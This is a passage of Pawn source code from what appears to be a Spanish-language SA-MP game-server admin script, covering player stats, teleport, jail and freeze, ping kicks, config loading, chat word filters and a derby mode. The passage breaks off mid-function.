	if(IsPlayerConnected(player1)) {
	    TotalGameTime(player1, h, m, s);
	    GetPlayerHealth(player1,player1health);
	    GetPlayerArmour(player1,player1armour);
	    getdate(year, month, day);
	    format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(player1)));
	    if(fexist(file)) P1Register = "Si"; else P1Register = "No";
	    if(strlen(dini_Get(file,"RegisteredDate")) < 3) RegDate = "No registrado"; else RegDate = dini_Get(file,"RegisteredDate");
 		if(PlayerInfo[player1][Deaths] == 0) pDeaths = 1; else pDeaths = PlayerInfo[player1][Deaths];
        format(string,sizeof(string),"{5783C2}Nick: {FFFFFF}[%s]\n{5783C2}Registrado: {FFFFFF}[%s]\n{5783C2}Fecha de Registro: {FFFFFF}[%s]\n{5783C2}Fecha de Hoy: {FFFFFF}[%d/%d/%d]\n{5783C2}Nivel: {FFFFFF}[%d]\n{5783C2}Nivel Vip: {FFFFFF}[%d]\n{5783C2}Asesinatos: {FFFFFF}[%d]\n{5783C2}Muertes: {FFFFFF}[%d]\n{5783C2}Test Ganados: {FFFFFF}[%d]\n{5783C2}Carreras Ganadas: {FFFFFF}[%d]\n{5783C2}Score: {FFFFFF}[%d]\n{5783C2}Ratio: {FFFFFF}[%0.2f]\n{5783C2}Dinero: {FFFFFF}[$%d]",
		PlayerName2(player1), P1Register,RegDate, day,month,year, PlayerInfo[player1][Level], PlayerInfo[player1][Vip], PlayerInfo[player1][Kills],PlayerInfo[player1][Deaths],PlayerInfo[player1][Twin],PlayerInfo[player1][Rwin],GetPlayerScore(player1), Float:PlayerInfo[player1][Kills]/Float:pDeaths,GetPlayerMoney(player1));
		format(string, sizeof string, "%s\n{5783C2}Dinero en Banco: {FFFFFF}[$%d]\n{5783C2}Tiempo: {FFFFFF}[%d hrs %d mins %d segs]",
	    string,PlayerInfo[player1][bank],h, m, s);
		return ShowPlayerDialog(playerid,5423,DIALOG_STYLE_LIST,"Estadisticas",string,"Aceptar","");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
}
#endif

CMD:stats2(playerid,params[])
{
    if(PlayerInfo[playerid][Level] >= 0) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Stats2 [Cuenta]");
	    new file[100], string[1000];
	    new P1Register[4], P1Banned[4];
	    format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(params));
	    if(fexist(file)) P1Register = "Si"; else P1Register = "No";
	    if(fexist(file)) P1Banned = "Si"; else P1Banned = "No";
      	if(fexist(file))
	    {
	        format(string,sizeof(string),"{5783C2}Nick: {FFFFFF}[%s]\n{5783C2}Registrado: {FFFFFF}[%s]\n{5783C2}Fecha de Registro: {FFFFFF}[%s]\n{5783C2}Última vez en línea: {FFFFFF}[%s]\n{5783C2}Nivel: {FFFFFF}[%d]\n{5783C2}Nivel Vip: {FFFFFF}[%d]\n{5783C2}Baneado: {FFFFFF}[%d]\n{5783C2}Asesinatos: {FFFFFF}[%d]\n{5783C2}Muertes: {FFFFFF}[%d]\n{5783C2}Test Ganados: {FFFFFF}[%d]\n{5783C2}Carreras Ganadas: {FFFFFF}[%d]\n{5783C2}Score: {FFFFFF}[%d]\n{5783C2}Dinero: {FFFFFF}[$%d]",
            params, P1Register, dini_Get(file, "RegisteredDate"), dini_Get(file, "LastOn"), dini_Int(file, "level"), dini_Int(file, "vip"), dini_Int(file, "banned"), dini_Int(file, "kills"), dini_Int(file, "deaths"), dini_Int(file, "twin"), dini_Int(file, "rwin"), dini_Int(file, "score"), dini_Int(file, "money"));
            format(string, sizeof string, "%s\n\n{5783C2}Dinero en Banco: {FFFFFF}[$%d]\n{5783C2}Tiempo: {FFFFFF}[%d hrs %d mins %d segs]",
	        string, dini_Int(file, "Bank"), dini_Int(file, "hours"), dini_Int(file, "minutes"), dini_Int(file, "seconds"));
			ShowPlayerDialog(playerid,5423,DIALOG_STYLE_LIST,"Estadisticas",string,"Aceptar","");
	    } else return SendClientMessage(playerid, red, "|Info| »{EAEAEA} Esa cuenta no existe.");
    } else return SendClientMessage(playerid, red, "ERROR: You are not a high enough level to use this command");
    return 1;
}
//------------------------------------------
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	if(BloquearComandosInDM[playerid] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes hacer Tp estando en un DM.");
	if(Informacion[clickedplayerid][Bloqueado] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador prohibio que hagan Tp hacia el. Dile que active su Tp con {C0C0C0}/Atp.");
	format(fString, sizeof(fString), "|Teleport| »{00BFFF} %s {EAEAEA}se teletransporto hacia el jugador {00BFFF}%s.",pName(playerid), pName(clickedplayerid));
	SendClientMessageToAll(red, fString);
	new Float:x, Float:y, Float:z;
	GetPlayerPos(clickedplayerid, x, y, z);
	TeleportPlayer(playerid, x + 2, y, z);
	return 0;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
    SetPlayerPosFindZ(playerid, fX, fY, fZ); 
    return 1;
}

//==================== [ Jail & Freeze ]========================================
forward Jail1(player1);
public Jail1(player1)
{
	TogglePlayerControllable(player1,false);
	new Float:x, Float:y, Float:z;	GetPlayerPos(player1,x,y,z);
	SetPlayerCameraPos(player1,x+10,y,z+10);SetPlayerCameraLookAt(player1,x,y,z);
	SetTimerEx("Jail2",1000,0,"d",player1);
}

forward Jail2(player1);
public Jail2(player1)
{
	new Float:x, Float:y, Float:z; GetPlayerPos(player1,x,y,z);
	SetPlayerCameraPos(player1,x+7,y,z+5); SetPlayerCameraLookAt(player1,x,y,z);
	if(GetPlayerState(player1) == PLAYER_STATE_ONFOOT) SetPlayerSpecialAction(player1,SPECIAL_ACTION_HANDSUP);
	SetTimerEx("Jail3",1000,0,"d",player1);
}

forward Jail3(player1);
public Jail3(player1)
{
	new Float:x, Float:y, Float:z; GetPlayerPos(player1,x,y,z);
	SetPlayerCameraPos(player1,x+3,y,z); SetPlayerCameraLookAt(player1,x,y,z);
}

forward JailPlayer(player1);
public JailPlayer(player1)
{
	TogglePlayerControllable(player1,true);
	SetPlayerPos(player1,197.6661,173.8179,1003.0234);
	SetPlayerInterior(player1,3);
	SetCameraBehindPlayer(player1);
	JailTimer[player1] = SetTimerEx("JailRelease",PlayerInfo[player1][LJailTime],0,"d",player1);
	PlayerInfo[player1][Jailed] = 1;
}

forward JailRelease(player1);
public JailRelease(player1)
{
	KillTimer( JailTimer[player1] );
	PlayerInfo[player1][LJailTime] = 0;  PlayerInfo[player1][Jailed] = 0;
	SetPlayerInterior(player1,0); SetPlayerPos(player1, 0.0, 0.0, 0.0); SpawnPlayer(player1);
	PlayerPlaySound(player1,1057,0.0,0.0,0.0);
}

//------------------------------------------------------------------------------
forward UnFreezeMe(player1);
public UnFreezeMe(player1)
{
	KillTimer( FreezeTimer[player1] );
	TogglePlayerControllable(player1,true);   PlayerInfo[player1][Frozen] = 0;
	PlayerPlaySound(player1,1057,0.0,0.0,0.0);	GameTextForPlayer(player1,"~w~Descongelado",3000,3);
}
//==============================================================================
forward PingKick(playerid);
public PingKick(playerid)
{
	if(ServerInfo[MaxPing] != 0)
	{
	    PingPos++; if(PingPos > PING_MAX_EXCEEDS) PingPos = 0;

		for(new i=0; i<MAX_PLAYERS; i++)
		{
			PlayerInfo[i][pPing][PingPos] = GetPlayerPing(i);

		    if(GetPlayerPing(i) > ServerInfo[MaxPing])
			{
				if(PlayerInfo[i][PingCount] == 0) PlayerInfo[i][PingTime] = TimeStamp();

	   			PlayerInfo[i][PingCount]++;
				if(TimeStamp() - PlayerInfo[i][PingTime] > PING_TIMELIMIT)
				{
	    			PlayerInfo[i][PingTime] = TimeStamp();
					PlayerInfo[i][PingCount] = 1;
				}
				else if(PlayerInfo[i][PingCount] >= PING_MAX_EXCEEDS)
				{
				    new Sum, x, string[128];
					while (x < PING_MAX_EXCEEDS) {
						Sum += PlayerInfo[i][pPing][x];
						x++;
					}
				    //new Average;
					//Average = (Sum / PING_MAX_EXCEEDS);
					format(string,sizeof(string),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Ping Alto)",PlayerName2(i),playerid);
   					SendClientMessageToAll(red,string);
					SaveToFile("KickLog",string);
					Kick(i);
				}
			}
		}
	}

	#if defined ANTI_MINIGUN
	new weap, bala;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && PlayerInfo[i][Level] == 0)
		{
			GetPlayerWeaponData(i, 7, weap, bala);
			if(bala > 1 && weap == 38) {
				//new string[128]; format(string,sizeof(string),"INFO: %s has a mingun with %d bala", PlayerName2(i), bala);
			}
		}
	}
	#endif
}

forward GodUpdate();
public GodUpdate()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && PlayerInfo[i][God] == 1) {
			SetPlayerHealth(i,100000);
			RepairVehicle(GetPlayerVehicleID(i));
			SetVehicleHealth(GetPlayerVehicleID(i),1000000.0);
		}
	}
}
//==========================[ Server Info Counters ]============================
forward LConnectedPlayers();
public LConnectedPlayers()
{
	new Connected;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) Connected++;
	return Connected;
}

forward JailedPlayers();
public JailedPlayers()
{
	new JailedCount;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Jailed] == 1) JailedCount++;
	return JailedCount;
}

forward FrozenPlayers();
public FrozenPlayers()
{
	new FrozenCount; for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Frozen] == 1) FrozenCount++;
	return FrozenCount;
}

forward MutedPlayers();
public MutedPlayers()
{
	new Count; for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Muted] == 1) Count++;
	return Count;
}

forward InVehCount();
public InVehCount()
{
	new InVeh; for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i)) InVeh++;
	return InVeh;
}

forward OnBikeCount();
public OnBikeCount()
{
	new BikeCount;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i)) {
		new LModel = GetVehicleModel(GetPlayerVehicleID(i));
		switch(LModel)
		{
			case 448,461,462,463,468,471,509,510,521,522,523,581,586:  BikeCount++;
		}
	}
	return BikeCount;
}

forward InCarCount();
public InCarCount()
{
	new PInCarCount;
	for(new i = 0; i < MAX_PLAYERS; i++) {
		if(IsPlayerConnected(i) && IsPlayerInAnyVehicle(i)) {
			new LModel = GetVehicleModel(GetPlayerVehicleID(i));
			switch(LModel)
			{
				case 448,461,462,463,468,471,509,510,521,522,523,581,586: {}
				default: PInCarCount++;
			}
		}
	}
	return PInCarCount;
}

forward AdminCount();
public AdminCount()
{
	new LAdminCount;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && PlayerInfo[i][Level] >= 1)	LAdminCount++;
	return LAdminCount;
}

forward RconAdminCount();
public RconAdminCount()
{
	new rAdminCount;
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerAdmin(i)) rAdminCount++;
	return rAdminCount;
}
//==========================[ Remote Console ]==================================
forward UnloadFS();
public UnloadFS()
{
	SendRconCommand("unloadfs ladmin4");
}

forward PrintWarning(const string[]);
public PrintWarning(const string[])
{
    new str[128];
    print("\n\n>		WARNING:\n");
    format(str, sizeof(str), " The  %s  folder is missing from scriptfiles", string);
    print(str);
    print("\n Please Create This Folder And Reload the Filterscript\n\n");
}
//==============================================================================
forward PutAtPos(playerid);
public PutAtPos(playerid)
{
	if (dUserINT(PlayerName2(playerid)).("x")!=0) {
     	SetPlayerPos(playerid, float(dUserINT(PlayerName2(playerid)).("x")), float(dUserINT(PlayerName2(playerid)).("y")), float(dUserINT(PlayerName2(playerid)).("z")) );
 		SetPlayerInterior(playerid,	(dUserINT(PlayerName2(playerid)).("interior"))	);
	}
}

forward PutAtDisconectPos(playerid);
public PutAtDisconectPos(playerid)
{
	if (dUserINT(PlayerName2(playerid)).("x1")!=0) {
    	SetPlayerPos(playerid, float(dUserINT(PlayerName2(playerid)).("x1")), float(dUserINT(PlayerName2(playerid)).("y1")), float(dUserINT(PlayerName2(playerid)).("z1")) );
		SetPlayerInterior(playerid,	(dUserINT(PlayerName2(playerid)).("interior1"))	);
	}
}

TotalGameTime(playerid, &h=0, &m=0, &s=0)
{
    PlayerInfo[playerid][TotalTime] = ( (gettime() - PlayerInfo[playerid][ConnectTime]) + (PlayerInfo[playerid][hours]*60*60) + (PlayerInfo[playerid][mins]*60) + (PlayerInfo[playerid][secs]) );

    h = floatround(PlayerInfo[playerid][TotalTime] / 3600, floatround_floor);
    m = floatround(PlayerInfo[playerid][TotalTime] / 60,   floatround_floor) % 60;
    s = floatround(PlayerInfo[playerid][TotalTime] % 60,   floatround_floor);

    return PlayerInfo[playerid][TotalTime];
}
//==============================================================================
stock IsPlayerLAdmin(playerid)
{
	if(PlayerInfo[playerid][Level] > 0)
		return true;
	else return false;
}
//==============================================================================


stock PlayerName2(playerid) {
  new plname[MAX_PLAYER_NAME];
  GetPlayerName(playerid, plname, sizeof(plname));
  return plname;
}

stock pName(playerid)
{
  new plname[MAX_PLAYER_NAME];
  GetPlayerName(playerid, plname, sizeof(plname));
  return plname;
}

stock TimeStamp()
{
	new time = GetTickCount() / 1000;
	return time;
}

stock PlayerSoundForAll(SoundID)
{
	for(new i = 0; i < MAX_PLAYERS; i++) PlayerPlaySound(i, SoundID, 0.0, 0.0, 0.0);
}

stock IsValidWeapon(weaponid)
{
    if (weaponid > 0 && weaponid < 19 || weaponid > 21 && weaponid < 47) return 1;
    return 0;
}

stock IsValidSkin(SkinID)
{
	if((SkinID == 0)||(SkinID == 7)||(SkinID >= 9 && SkinID <= 41)||(SkinID >= 43 && SkinID <= 64)||(SkinID >= 66 && SkinID <= 73)||(SkinID >= 75 && SkinID <= 85)||(SkinID >= 87 && SkinID <= 118)||(SkinID >= 120 && SkinID <= 148)||(SkinID >= 150 && SkinID <= 207)||(SkinID >= 209 && SkinID <= 264)||(SkinID >= 274 && SkinID <= 288)||(SkinID >= 290 && SkinID <= 299)) return true;
	else return false;
}

stock IsNumeric(string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}

stock ReturnPlayerID(PlayerName[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(strfind(pName(i),PlayerName,true)!=-1) return i;
		}
	}
	return INVALID_PLAYER_ID;
}

GetVehicleModelIDFromName(vname[])
{
	for(new i = 0; i < 211; i++)
	{
		if ( strfind(VehicleName[i], vname, true) != -1 )
			return i + 400;
	}
	return -1;
}

stock GetWeaponIDFromName(WeaponName[])
{
	if(strfind("molotov",WeaponName,true)!=-1) return 18;
	for(new i = 0; i <= 46; i++)
	{
		switch(i)
		{
			case 0,19,20,21,44,45: continue;
			default:
			{
				new wpname[32]; GetWeaponName(i,wpname,32);
				if(strfind(wpname,WeaponName,true) != -1) return i;
			}
		}
	}
	return -1;
}

stock DisableWord(const badword[], text[])
{
   	for(new i=0; i<128; i++)
   	{
		if (strfind(text[i], badword, true) == 0)
		{
			for(new a=0; a<128; a++)
			{
				if (a >= i && a < i+strlen(badword)) text[a]='*';
			}
		}
	}
}

//==============================================================================
forward MessageToAdmins(color,const string[]);
public MessageToAdmins(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 1) SendClientMessage(i, color, string);
	}
	return 1;
}

forward MessageToOwners(color,const string[]);
public MessageToOwners(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Level] >= 10) SendClientMessage(i, color, string);
	}
	return 1;
}

forward MessageToVips(color,const string[]);
public MessageToVips(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) == 1) if (PlayerInfo[i][Vip] >= 1) SendClientMessage(i, color, string);
	}
	return 1;
}

stock CMDMessageToAdmins(playerid,command[])
{
	if(ServerInfo[AdminCmdMsg] == 0) return 1;
	new string[128]; GetPlayerName(playerid,string,sizeof(string));
	format(string,sizeof(string),"{FFA500}[ADMIN] %s ha usado el comando %s",string,command);
	return MessageToAdmins(blue,string);
}
//=====================[ SAVING DATA ] =========================================
forward SaveToFile(filename[],text[]);
public SaveToFile(filename[],text[])
{
	#if defined SAVE_LOGS
	new File:LAdminfile, filepath[128], string[128], year,month,day, hour,minute,second;
	getdate(year,month,day); gettime(hour,minute,second);

	format(filepath,sizeof(filepath),"ladmin/logs/%s.txt",filename);
	LAdminfile = fopen(filepath,io_append);
	format(string,sizeof(string),"[%d.%d.%d %d:%d:%d] %s\r\n",day,month,year,hour,minute,second,text);
	fwrite(LAdminfile,string);
	fclose(LAdminfile);
	#endif

	return 1;
}
//----------------------------[ADMINISTRATION SYSTEM]---------------------------
//==============================================================================
#if defined DISPLAY_CONFIG
stock ConfigInConsole()
{
	print(" ________ Configuration ___________\n");
	print(" __________ Chat & Messages ______");
	if(ServerInfo[AntiSwear] == 0) print("  Anti Swear:              Disabled "); else print("  Anti Swear:             Enabled ");
	if(ServerInfo[AntiSpam] == 0)  print("  Anti Spam:               Disabled "); else print("  Anti Spam:              Enabled ");
	if(ServerInfo[ReadCmds] == 0)  print("  Read Cmds:               Disabled "); else print("  Read Cmds:              Enabled ");
	if(ServerInfo[ReadPMs] == 0)   print("  Read PMs:                Disabled "); else print("  Read PMs:               Enabled ");
	if(ServerInfo[ConnectMessages] == 0) print("  Connect Messages:        Disabled "); else print("  Connect Messages:       Enabled ");
  	if(ServerInfo[AdminCmdMsg] == 0) print("  Admin Cmd Messages:     Disabled ");  else print("  Admin Cmd Messages:     Enabled ");
	if(ServerInfo[ReadPMs] == 0)   print("  Anti capital letters:    Disabled \n"); else print("  Anti capital letters:   Enabled \n");
	print(" __________ Skins ________________");
	if(ServerInfo[AdminOnlySkins] == 0) print("  AdminOnlySkins:         Disabled "); else print("  AdminOnlySkins:         Enabled ");
	printf("  Admin Skin 1 is:         %d", ServerInfo[AdminSkin] );
	printf("  Admin Skin 2 is:         %d\n", ServerInfo[AdminSkin2] );
	print(" ________ Server Protection ______");
	if(ServerInfo[AntiBot] == 0) print("  Anti Bot:                Disabled "); else print("  Anti Bot:                Enabled ");
	if(ServerInfo[NameKick] == 0) print("  Bad Name Kick:           Disabled\n"); else print("  Bad Name Kick:           Enabled\n");
	print(" __________ Ping Control _________");
	if(ServerInfo[MaxPing] == 0) print("  Ping Control:            Disabled"); else print("  Ping Control:            Enabled");
	printf("  Max Ping:                %d\n", ServerInfo[MaxPing] );
	print(" __________ Players ______________");
	if(ServerInfo[GiveWeap] == 0) print("  Save/Give Weaps:         Disabled"); else print("  Save/Give Weaps:         Enabled");
	if(ServerInfo[GiveMoney] == 0) print("  Save/Give Money:         Disabled\n"); else print("  Save/Give Money:         Enabled\n");
	print(" __________ Other ________________");
	printf("  Max Admin Level:         %d", ServerInfo[MaxAdminLevel] );
	if(ServerInfo[Locked] == 0) print("  Server Locked:           No"); else print("  Server Locked:           Yes");
	if(ServerInfo[AutoLogin] == 0) print("  Auto Login:             Disabled\n"); else print("  Auto Login:              Enabled\n");
}
#endif

//=====================[ Configuration ] =======================================
stock UpdateConfig()
{
	new file[256], File:file2, string[100]; format(file,sizeof(file),"ladmin/config/Config.ini");
	ForbiddenWordCount = 0;
	BadNameCount = 0;
	BadPartNameCount = 0;

	if(!dini_Exists("ladmin/config/aka.txt")) dini_Create("ladmin/config/aka.txt");

	if(!dini_Exists(file))
	{
		dini_Create(file);
		print("\n >Configuration File Successfully Created");
	}

	if(!dini_Isset(file,"MaxPing")) dini_IntSet(file,"MaxPing",1200);
	if(!dini_Isset(file,"ReadPms")) dini_IntSet(file,"ReadPMs",1);
	if(!dini_Isset(file,"ReadCmds")) dini_IntSet(file,"ReadCmds",1);
	if(!dini_Isset(file,"MaxAdminLevel")) dini_IntSet(file,"MaxAdminLevel",5);
	if(!dini_Isset(file,"AdminOnlySkins")) dini_IntSet(file,"AdminOnlySkins",0);
	if(!dini_Isset(file,"AdminSkin")) dini_IntSet(file,"AdminSkin",217);
	if(!dini_Isset(file,"AdminSkin2")) dini_IntSet(file,"AdminSkin2",214);
	if(!dini_Isset(file,"AntiBot")) dini_IntSet(file,"AntiBot",1);
	if(!dini_Isset(file,"AntiSpam")) dini_IntSet(file,"AntiSpam",1);
	if(!dini_Isset(file,"AntiSwear")) dini_IntSet(file,"AntiSwear",1);
	if(!dini_Isset(file,"NameKick")) dini_IntSet(file,"NameKick",1);
 	if(!dini_Isset(file,"PartNameKick")) dini_IntSet(file,"PartNameKick",1);
	if(!dini_Isset(file,"NoCaps")) dini_IntSet(file,"NoCaps",0);
	if(!dini_Isset(file,"Locked")) dini_IntSet(file,"Locked",0);
	if(!dini_Isset(file,"SaveWeap")) dini_IntSet(file,"SaveWeap",1);
	if(!dini_Isset(file,"SaveMoney")) dini_IntSet(file,"SaveMoney",1);
	if(!dini_Isset(file,"ConnectMessages")) dini_IntSet(file,"ConnectMessages",1);
	if(!dini_Isset(file,"AdminCmdMessages")) dini_IntSet(file,"AdminCmdMessages",1);
	if(!dini_Isset(file,"AutoLogin")) dini_IntSet(file,"AutoLogin",1);
	if(!dini_Isset(file,"MaxMuteWarnings")) dini_IntSet(file,"MaxMuteWarnings",4);
	if(!dini_Isset(file,"MustLogin")) dini_IntSet(file,"MustLogin",0);
	if(!dini_Isset(file,"MustRegister")) dini_IntSet(file,"MustRegister",0);

	if(dini_Exists(file))
	{
		ServerInfo[MaxPing] = dini_Int(file,"MaxPing");
		ServerInfo[ReadPMs] = dini_Int(file,"ReadPMs");
		ServerInfo[ReadCmds] = dini_Int(file,"ReadCmds");
		ServerInfo[MaxAdminLevel] = dini_Int(file,"MaxAdminLevel");
		ServerInfo[AdminOnlySkins] = dini_Int(file,"AdminOnlySkins");
		ServerInfo[AdminSkin] = dini_Int(file,"AdminSkin");
		ServerInfo[AdminSkin2] = dini_Int(file,"AdminSkin2");
		ServerInfo[AntiBot] = dini_Int(file,"AntiBot");
		ServerInfo[AntiSpam] = dini_Int(file,"AntiSpam");
		ServerInfo[AntiSwear] = dini_Int(file,"AntiSwear");
		ServerInfo[NameKick] = dini_Int(file,"NameKick");
		ServerInfo[PartNameKick] = dini_Int(file,"PartNameKick");
		ServerInfo[NoCaps] = dini_Int(file,"NoCaps");
		ServerInfo[Locked] = dini_Int(file,"Locked");
		ServerInfo[GiveWeap] = dini_Int(file,"SaveWeap");
		ServerInfo[GiveMoney] = dini_Int(file,"SaveMoney");
		ServerInfo[ConnectMessages] = dini_Int(file,"ConnectMessages");
		ServerInfo[AdminCmdMsg] = dini_Int(file,"AdminCmdMessages");
		ServerInfo[AutoLogin] = dini_Int(file,"AutoLogin");
		ServerInfo[MaxMuteWarnings] = dini_Int(file,"MaxMuteWarnings");
		ServerInfo[MustLogin] = dini_Int(file,"MustLogin");
		ServerInfo[MustRegister] = dini_Int(file,"MustRegister");
		print("\n -Configuration Settings Loaded");
	}

	//forbidden names
	if((file2 = fopen("ladmin/config/ForbiddenNames.cfg",io_read)))
	{
		while(fread(file2,string))
		{
		    for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
            BadNames[BadNameCount] = string;
            BadNameCount++;
		}
		fclose(file2);	printf(" -%d Forbidden Names Loaded", BadNameCount);
	}

	//forbidden part of names
	if((file2 = fopen("ladmin/config/ForbiddenPartNames.cfg",io_read)))
	{
		while(fread(file2,string))
		{
		    for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
            BadPartNames[BadPartNameCount] = string;
            BadPartNameCount++;
		}
		fclose(file2);	printf(" -%d Forbidden Tags Loaded", BadPartNameCount);
	}

	//forbidden words
	if((file2 = fopen("ladmin/config/ForbiddenWords.cfg",io_read)))
	{
		while(fread(file2,string))
		{
		    for(new i = 0, j = strlen(string); i < j; i++) if(string[i] == '\n' || string[i] == '\r') string[i] = '\0';
            ForbiddenWords[ForbiddenWordCount] = string;
            ForbiddenWordCount++;
		}
		fclose(file2);	printf(" -%d Forbidden Words Loaded", ForbiddenWordCount);
	}
}
//================================Get Driver Id=================================
stock GetDriverID(vehicleid)
{
	for(new i=0; i<MAX_VEHICLES; i++) {
		if(IsPlayerConnected(i)) {
			if(IsPlayerInAnyVehicle(i)) {
				if(GetPlayerVehicleID(i) == vehicleid) {
					return i;
				}
			}
		}
	}
	return -1;
}
//==============================Is Player in Area===============================
public isPlayerInArea(playerID, Float:data[4])
{
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerID, X, Y, Z);
	if(X >= data[0] && X <= data[2] && Y >= data[1] && Y <= data[3]) {
	return 1;
	}
	return 0;
}
forward destroy(playerid);
public destroy(playerid)
{
	if(CreatedRamp[playerid]==true) {
	return DestroyObject(Ramp[playerid]), CreatedRamp[playerid] = false;
	}else return 0;
}
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if(IsPlayerInAnyVehicle(playerid) && FireShotON[playerid] == 1 && FireShot[playerid] == 0 && newkeys & 4 && !IsValidObject(gRocketObj[playerid]))
	{
 		SetPlayerTime(playerid,0,0);
  		new
	        vehicleid = GetPlayerVehicleID(playerid),
			Float:x,
			Float:y,
			Float:z,
			Float:r,
			Float:dist = 50.0,
			Float:tmpang,
			Float:tmpx,
			Float:tmpy,
			Float:tmpz;

		FireShot[playerid] = 1;
        SetTimerEx("ShotFire", 1000, 0, "i", playerid);
		GetVehiclePos(vehicleid, x, y, z);
	    GetVehicleZAngle(vehicleid, r);
		new rand = random(11);
  		switch(rand)
  		{
			case 0: gRocketObj[playerid] = CreateObject(18647, x, y, z, 0, 0, r);
			case 1: gRocketObj[playerid] = CreateObject(18648, x, y, z, 0, 0, r);
			case 2: gRocketObj[playerid] = CreateObject(18649, x, y, z, 0, 0, r);
			case 3: gRocketObj[playerid] = CreateObject(18650, x, y, z, 0, 0, r);
			case 4: gRocketObj[playerid] = CreateObject(18651, x, y, z, 0, 0, r);
			case 5: gRocketObj[playerid] = CreateObject(18652, x, y, z, 0, 0, r);
            case 6: gRocketObj[playerid] = CreateObject(18647, x, y, z, 0, 0, r+90);
			case 7: gRocketObj[playerid] = CreateObject(18648, x, y, z, 0, 0, r+90);
			case 8: gRocketObj[playerid] = CreateObject(18649, x, y, z, 0, 0, r+90);
			case 9: gRocketObj[playerid] = CreateObject(18650, x, y, z, 0, 0, r+90);
			case 10: gRocketObj[playerid] = CreateObject(18651, x, y, z, 0, 0, r+90);
			case 11: gRocketObj[playerid] = CreateObject(18652, x, y, z, 0, 0, r+90);
		}
		//Thanks to Southclaw helped me alot
		for(new i;i<MAX_PLAYERS;i++)
		{
		    if(i == playerid)continue;
		    if(IsPlayerInRangeOfPoint(i, 50.0, x, y, z))
		    {
		        GetPlayerPos(i, tmpx, tmpy, tmpz);
		        tmpang = (90-atan2(tmpy-y, tmpx-x));
		        if(tmpang < 0)tmpang = 360.0+tmpang;
		        tmpang = 360.0 - tmpang;
				if( floatabs(tmpang-r) < 5.0)
				{
				    dist = GetPlayerDistanceFromPoint(i, x, y, z);
				}
		    }
		}
  	    MoveObject(gRocketObj[playerid],x + (dist * floatsin(-r, degrees)),y + (dist * floatcos(-r, degrees)),z,100.0);
	}
	if(PlayerAutoCBUG[playerid]==1)
    {
	    if(RELEASED(KEY_FIRE))
	    {
		    if(GetPlayerWeapon(playerid) == 24 || GetPlayerWeapon(playerid) == 25 || GetPlayerWeapon(playerid) == 34)//Estas son las armas con las que funciona el autocbug cambia 25 o 34 por las que quieras no cambies la 24 ya que es la deagle
		    {
				new Float:z_pos[3];
		        GetPlayerPos(playerid, z_pos[0], z_pos[1], z_pos[2]);
		        SetPlayerPos(playerid, z_pos[0], z_pos[1]+0.00001, z_pos[2]);
		    }
	    }
   	}
	//======================================== SISTEMA DE DERBY =======================================
		if(newkeys & KEY_SECONDARY_ATTACK)
	{
		if(PI[playerid][P_GAMEMODE] == GAME_DERBY)
		{
			if(PI[playerid][P_DERBY_STATUS] == PD_DEAD)
			{
				PI[playerid][P_STATUS] = STATUS_SPAWNED;

				new old = PI[playerid][P_DERBY_SPECTATEPLAYER];
				for(new i = PI[playerid][P_DERBY_SPECTATEPLAYER], j = MAX_PLAYERS; i <= j; i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PI[i][P_GAMEMODE] == GAME_DERBY)
						{
							if(PI[i][P_DERBY_STATUS] == PD_NORMAL)
							{
								if(PI[playerid][P_DERBY_SPECTATEPLAYER] != i)
								{
									PlayerSpectateVehicle(playerid, PI[i][P_DERBY_VEHICLEID]);
									PI[playerid][P_DERBY_SPECTATEPLAYER] = i;
									new str[70]; format(str, 70, "_~n~_~n~_~n~_~n~~y~-_~g~~h~%s_~b~~h~%d_~y~-~n~_", PI[ PI[playerid][P_DERBY_SPECTATEPLAYER] ][P_NAME], PI[playerid][P_DERBY_SPECTATEPLAYER]);
									GameTextForPlayer(playerid, str, 3000, 3);
									return 1;
								}
							}
						}
					}
				}
				if(PI[playerid][P_DERBY_SPECTATEPLAYER] == old)
				{
					for(new i = 0, j = MAX_PLAYERS; i <= j; i++)
					{
						if(IsPlayerConnected(i))
						{
							if(PI[i][P_GAMEMODE] == GAME_DERBY)
							{
								if(PI[i][P_DERBY_STATUS] == PD_NORMAL)
								{
